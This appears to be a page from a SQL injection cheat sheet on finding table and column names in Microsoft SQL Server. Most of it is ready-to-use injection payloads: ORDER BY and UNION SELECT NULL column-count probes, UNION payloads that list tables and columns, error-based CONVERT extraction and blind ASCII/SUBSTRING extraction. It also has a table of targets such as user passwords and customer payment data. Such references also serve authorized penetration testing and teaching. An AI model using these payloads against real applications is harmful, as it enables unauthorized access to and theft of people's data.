---
title: Tables and Columns
description: How to discover and extract table and column information in MSSQL
category: Information Gathering
order: 7
tags: ["tables", "columns", "schema discovery"]
lastUpdated: 2023-03-15
---

## Tables and Columns

Discovering table and column information is a crucial step in SQL injection attacks against Microsoft SQL Server. This knowledge allows for targeted data extraction and more advanced exploitation.

### Determining Number of Columns

Before extracting table information, you need to determine the number of columns in the current query result set.

#### Using ORDER BY

```sql
-- Incrementally increase the number until you get an error
ORDER BY 1-- (Valid)
ORDER BY 2-- (Valid)
ORDER BY 3-- (Valid)
ORDER BY n-- (Error when n is greater than the number of columns)
```

#### Using UNION SELECT NULL

```sql
-- Incrementally try different numbers of NULLs
' UNION SELECT NULL--         -- Errors if wrong number of columns
' UNION SELECT NULL,NULL--    -- Errors if wrong number of columns
' UNION SELECT NULL,NULL,NULL-- -- Works if query has exactly 3 columns
```

#### Using ERROR Messages

```sql
-- Using HAVING clause to extract column count
HAVING 1=1--           -- Error message can indicate column count
```

### Information Schema Views

SQL Server provides standardized INFORMATION_SCHEMA views for metadata discovery:

#### Listing Tables

```sql
-- List all tables in the current database
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'

-- Include schema name and table type
SELECT table_schema, table_name, table_type 
FROM information_schema.tables 
ORDER BY table_schema, table_name
```

#### Listing Columns

```sql
-- List all columns for a specific table
SELECT column_name, data_type, character_maximum_length 
FROM information_schema.columns 
WHERE table_name = 'users'

-- List all columns with their tables
SELECT table_name, column_name, data_type, character_maximum_length 
FROM information_schema.columns 
ORDER BY table_name, ordinal_position
```

### System Catalog Views

SQL Server's system catalog views provide more detailed metadata:

#### Tables via sys.tables and sys.objects

```sql
-- List user tables using sys.tables
SELECT name, create_date FROM sys.tables ORDER BY name

-- Using sys.objects (works in older versions too)
SELECT name FROM sys.objects WHERE type = 'U' ORDER BY name
```

#### Columns via sys.columns

```sql
-- Get columns for a specific table
SELECT name, column_id, system_type_id 
FROM sys.columns 
WHERE object_id = OBJECT_ID('dbo.users')

-- Get all columns with their table names
SELECT o.name AS table_name, c.name AS column_name 
FROM sys.columns c 
JOIN sys.objects o ON o.object_id = c.object_id 
WHERE o.type = 'U'
ORDER BY o.name, c.column_id
```

### Legacy System Tables (SQL Server 2000 and earlier)

```sql
-- List tables
SELECT name FROM sysobjects WHERE xtype = 'U'

-- List columns for a table
SELECT c.name FROM syscolumns c
JOIN sysobjects o ON c.id = o.id
WHERE o.name = 'users'
```

### String Concatenation for Multiple Results

When you can only return a single value, use concatenation:

```sql
-- Concatenate table names (SQL Server 2017+)
SELECT STRING_AGG(name, ',') FROM sys.tables

-- Older SQL Server versions using XML PATH
SELECT STUFF((
    SELECT ',' + name
    FROM sys.tables
    FOR XML PATH('')
), 1, 1, '')
```

### Practical Injection Examples

#### UNION Attack for Tables

```sql
-- Basic UNION attack to get table names
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--

-- Get both schema and table names
' UNION SELECT NULL, table_schema + '.' + table_name, NULL FROM information_schema.tables--
```

#### UNION Attack for Columns

```sql
-- Get columns for a specific table
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--

-- Get table and column names
' UNION SELECT NULL, table_name + '.' + column_name, NULL FROM information_schema.columns--
```

#### Error-Based Extraction

```sql
-- Using error-based extraction for table names
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--
```

#### Blind Extraction

```sql
-- Check first character of first table name
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables), 1, 1)) = 117-- 
-- Where 117 is ASCII for 'u'
```

### Database Link Traversal

For linked servers, you can query tables across servers:

```sql
-- Query tables on linked server
SELECT * FROM [linked_server].master.information_schema.tables

-- Four-part naming syntax
SELECT * FROM [linked_server].[database].[schema].[table]
```

### System Tables to Target

Common interesting tables to look for:

| Table Name | Description | Interesting Columns |
|------------|-------------|---------------------|
| users, accounts, members | User information | username, password, email |
| customers, clients | Customer data | name, email, address, payment_info |
| orders, transactions | Order information | order_id, customer_id, amount |
| products, items | Product catalog | id, name, price |
| config, settings | Configuration data | setting_name, setting_value |
| employees, staff | Employee information | name, salary, position |

### Notes

1. Some system tables and views require elevated privileges
2. Information schema views are more standard across database systems
3. System catalog views (sys.*) provide SQL Server-specific details
4. For very large databases, query performance may be affected
5. Column and table names are usually case-insensitive in SQL Server